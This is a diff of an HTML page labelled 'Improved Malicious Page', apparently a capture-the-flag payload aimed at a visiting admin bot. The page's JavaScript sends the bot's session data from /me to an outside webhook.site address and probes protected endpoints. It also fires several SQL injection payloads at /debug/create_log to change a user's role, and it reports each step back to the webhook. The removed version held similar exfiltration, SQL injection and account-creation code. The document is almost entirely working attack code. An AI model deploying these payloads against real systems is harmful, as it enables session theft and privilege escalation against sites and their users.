@@ -1,84 +1,167 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Malicious Page</title>
+    <title>Improved Malicious Page</title>
 </head>
 <body>
-    <h1>Innocent Looking Page</h1>
-    <p>This page looks normal but contains malicious JavaScript.</p>
+    <h1>Testing Page</h1>
+    <p>Executing improved payload...</p>
     
     <script>
-        // This script will run when the bot visits the page
-        // The bot is logged in with user privileges
+        const WEBHOOK = 'https://webhook.site/af720e13-405d-440f-8f77-30b72ada354f';
         
-        // Option 1: Try to make a request to the vulnerable endpoint
-        function exploitSQLInjection() {
-            const payload = "');UPDATE users SET role='user' WHERE username='[YOUR_USERNAME]';/*";
-            
-            fetch('/debug/create_log', {
+        function sendWebhook(data) {
+            fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Content-Type': 'application/json'
                 },
-                body: 'log=' + encodeURIComponent(payload),
-                credentials: 'include'
-            }).then(response => {
-                console.log('SQL injection attempt completed');
-            }).catch(error => {
-                console.error('Error:', error);
-            });
+                body: JSON.stringify(data)
+            }).catch(e => console.log('Webhook error:', e));
         }
         
-        // Option 2: Exfiltrate session data
-        function exfiltrateSession() {
-            // Send current user info to our external server
-            fetch('/me', {
-                credentials: 'include'
-            }).then(response => response.json())
-            .then(data => {
-                // Send the user data to our external server
-                fetch('https://webhook.site/af720e13-405d-440f-8f77-30b72ada354f', {
-                    method: 'POST',
-                    body: JSON.stringify(data),
-                    headers: {
-                        'Content-Type': 'application/json'
+        // Send initial confirmation
+        sendWebhook({
+            status: 'XSS payload v2 loaded',
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            location: window.location.href
+        });
+        
+        // Check current user session
+        async function checkSession() {
+            try {
+                const response = await fetch('/me', {
+                    method: 'GET',
+                    credentials: 'same-origin'
+                });
+                
+                if (response.ok) {
+                    const userData = await response.json();
+                    sendWebhook({
+                        status: 'Session data retrieved',
+                        userData: userData
+                    });
+                    return userData;
+                } else {
+                    sendWebhook({
+                        status: 'Session check failed',
+                        statusCode: response.status,
+                        statusText: response.statusText
+                    });
+                }
+            } catch (error) {
+                sendWebhook({
+                    status: 'Session check error',
+                    error: error.toString()
+                });
+            }
+            return null;
+        }
+        
+        // Attempt SQL injection
+        async function attemptSQLInjection() {
+            // Try multiple payloads
+            const payloads = [
+                "');UPDATE users SET role='user' WHERE id=15;/*",
+                "');UPDATE users SET role='user' WHERE username='punypuny';/*",
+                "test');UPDATE users SET role='user' WHERE id=15;/*"
+            ];
+            
+            for (let i = 0; i < payloads.length; i++) {
+                const payload = payloads[i];
+                try {
+                    const response = await fetch('/debug/create_log', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: 'log=' + encodeURIComponent(payload),
+                        credentials: 'same-origin'
+                    });
+                    
+                    sendWebhook({
+                        status: 'SQL injection attempt ' + (i + 1),
+                        payload: payload,
+                        responseStatus: response.status,
+                        responseOk: response.ok
+                    });
+                    
+                    if (response.ok) {
+                        sendWebhook({
+                            status: 'SQL injection SUCCESS',
+                            payload: payload
+                        });
+                        break;
                     }
-                });
-            });
+                } catch (error) {
+                    sendWebhook({
+                        status: 'SQL injection error ' + (i + 1),
+                        payload: payload,
+                        error: error.toString()
+                    });
+                }
+                
+                // Wait between attempts
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
         }
         
-        // Option 3: Create a new user with user role (if possible)
-        function createPrivilegedUser() {
-            const newUsername = 'hacked_user_' + Math.random().toString(36).substr(2, 9);
-            const password = 'password123';
+        // Try to access protected endpoints to see what's available
+        async function probeEndpoints() {
+            const endpoints = ['/checker', '/scrap', '/files', '/debug/create_log'];
             
-            fetch('/register', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: `username=${newUsername}&password=${password}`,
-                credentials: 'include'
-            }).then(() => {
-                // After creating user, try to upgrade their role
-                const sqlPayload = "');UPDATE users SET role='user' WHERE username='" + newUsername + "';/*";
-                return fetch('/debug/create_log', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: 'log=' + encodeURIComponent(sqlPayload),
-                    credentials: 'include'
+            for (const endpoint of endpoints) {
+                try {
+                    const response = await fetch(endpoint, {
+                        method: 'GET',
+                        credentials: 'same-origin'
+                    });
+                    
+                    sendWebhook({
+                        status: 'Endpoint probe',
+                        endpoint: endpoint,
+                        statusCode: response.status,
+                        accessible: response.ok || response.status === 302
+                    });
+                } catch (error) {
+                    sendWebhook({
+                        status: 'Endpoint probe error',
+                        endpoint: endpoint,
+                        error: error.toString()
+                    });
+                }
+            }
+        }
+        
+        // Execute the attack sequence
+        async function executeAttack() {
+            // Step 1: Check what user we are
+            const userData = await checkSession();
+            
+            // Step 2: Probe available endpoints
+            await probeEndpoints();
+            
+            // Step 3: If we have user role, attempt SQL injection
+            if (userData && userData.role === 'user') {
+                sendWebhook({
+                    status: 'Bot has user role, attempting SQL injection'
                 });
+                await attemptSQLInjection();
+            } else {
+                sendWebhook({
+                    status: 'Bot does not have user role',
+                    botRole: userData ? userData.role : 'unknown'
+                });
+            }
+            
+            sendWebhook({
+                status: 'Attack sequence completed'
             });
         }
         
-        // Execute the attack
-        setTimeout(() => {
-            exploitSQLInjection();
-            exfiltrateSession();
-            createPrivilegedUser();
-        }, 1000);
+        // Start attack after page loads
+        setTimeout(executeAttack, 1000);
     </script>
 </body>
 </html>
